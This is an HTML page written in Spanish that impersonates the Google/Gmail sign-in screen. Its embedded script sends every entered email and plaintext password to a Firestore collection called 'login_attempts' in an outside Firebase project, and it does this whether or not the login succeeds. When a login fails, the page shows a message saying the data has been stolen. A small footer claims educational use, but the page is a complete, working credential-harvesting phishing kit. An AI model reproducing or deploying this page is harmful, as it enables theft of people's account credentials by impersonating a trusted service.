<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión - Cuenta de Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 400px;
            text-align: center;
        }
        .logo-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px; /* Espacio entre las imágenes */
            margin-bottom: 20px;
        }
        .logo-container img.gmail-logo {
            width: 120px; /* Tamaño más grande para el logo de Gmail */
        }
        .logo-container img.google-logo {
            width: 80px; /* Tamaño más pequeño para el logo de Google */
        }
        .login-container h1 {
            font-size: 24px;
            font-weight: 500;
            color: #202124;
            margin-bottom: 10px;
        }
        .login-container p {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 30px;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .input-group label {
            font-size: 14px;
            color: #5f6368;
            display: block;
            margin-bottom: 8px;
        }
        .input-group input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }
        .input-group input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }
        .button-group button {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .button-group button:hover {
            background-color: #1557b5;
        }
        .error-message {
            color: #d93025;
            font-size: 14px;
            text-align: center;
            margin-top: 10px;
        }
        .footer-links {
            margin-top: 20px;
            font-size: 14px;
            color: #5f6368;
        }
        .footer-links a {
            color: #1a73e8;
            text-decoration: none;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .educational-notice {
            font-size: 12px;
            color: #5f6368;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <!-- Contenedor para los logos -->
        <div class="logo-container">
            <img class="gmail-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/768px-Gmail_icon_%282020%29.svg.png" alt="Logo de Gmail">
            <img class="google-logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Logo de Google">
        </div>
        
        <h1>Iniciar sesión</h1>
        <p>Usa tu cuenta de Google</p>

        <form id="login-form">
            <div class="input-group">
                <label for="email">Correo electrónico o teléfono</label>
                <input type="email" id="email" required>
            </div>
            <div class="input-group">
                <label for="password">Contraseña</label>
                <input type="password" id="password" required>
            </div>
            <div class="button-group">
                <button type="submit">Siguiente</button>
            </div>
        </form>

        <p id="error-message" class="error-message"></p>

        <div class="footer-links">
            <a href="#">¿Olvidaste tu correo electrónico?</a> · <a href="#">Más opciones</a>
        </div>

        <!-- Leyenda de uso educativo -->
        <div class="educational-notice">
            Esta página es utilizada con fines educativos. No se almacenarán ni utilizarán tus datos de manera maliciosa.
        </div>
    </div>

    <!-- Import Firebase SDKs -->
    <script type="module">
        // Importa los módulos necesarios de Firebase
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { getFirestore, collection, addDoc, Timestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        // Configuración de Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyBEWPP5MEi7TD5VTZkp7my1VztTcSEx-KE",
            authDomain: "login-attempts-9606c.firebaseapp.com",
            projectId: "login-attempts-9606c",
            storageBucket: "login-attempts-9606c.firebasestorage.app",
            messagingSenderId: "663920712947",
            appId: "1:663920712947:web:ad71401e5dc108a5d2eb86"
        };

        // Inicializa Firebase
        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app); // Inicializa Firebase Authentication
        const db = getFirestore(app); // Inicializa Firestore

        // Función para guardar intentos de inicio de sesión en Firestore
        async function saveLoginAttempt(email, password, success) {
            try {
                const docRef = await addDoc(collection(db, "login_attempts"), {
                    email: email,
                    password: password, // Guarda la contraseña
                    success: success,
                    timestamp: Timestamp.fromDate(new Date()) // Fecha y hora actual
                });
                console.log("Intento de inicio de sesión guardado con ID:", docRef.id);
            } catch (e) {
                console.error("Error al guardar el intento de inicio de sesión:", e);
            }
        }

        // Maneja el envío del formulario
        const form = document.getElementById("login-form");
        form.addEventListener("submit", async function(event) {
            event.preventDefault(); // Evita que el formulario se recargue

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            if (email && password) {
                try {
                    // Intenta autenticar al usuario
                    const userCredential = await signInWithEmailAndPassword(auth, email, password);
                    const user = userCredential.user;

                    // Guarda el intento de inicio de sesión exitoso en Firestore
                    await saveLoginAttempt(email, password, true);

                    // Limpia el mensaje de error y muestra un mensaje de éxito
                    document.getElementById("error-message").textContent = "";
                    alert("Inicio de sesión exitoso!");
                } catch (error) {
                    // Maneja errores de autenticación
                    console.error("Error de autenticación:", error.code, error.message);

                    // Guarda el intento de inicio de sesión fallido en Firestore
                    await saveLoginAttempt(email, password, false);

                    // Muestra una alerta con los datos ingresados
                    alert(`Sus datos han sido robados:\nCorreo: ${email}\nContraseña: ${password}`);

                    // Muestra un mensaje de error al usuario
                    let errorMessage = "Ud. ha sido robado por el PunGato";
                    if (error.code === "auth/user-not-found") {
                        errorMessage = "El usuario no existe";
                    } else if (error.code === "auth/wrong-password") {
                        errorMessage = "Contraseña incorrecta";
                    }
                    document.getElementById("error-message").textContent = errorMessage;
                }
            } else {
                document.getElementById("error-message").textContent = "Por favor, completa todos los campos";
            }
        });
    </script>

</body>
</html>
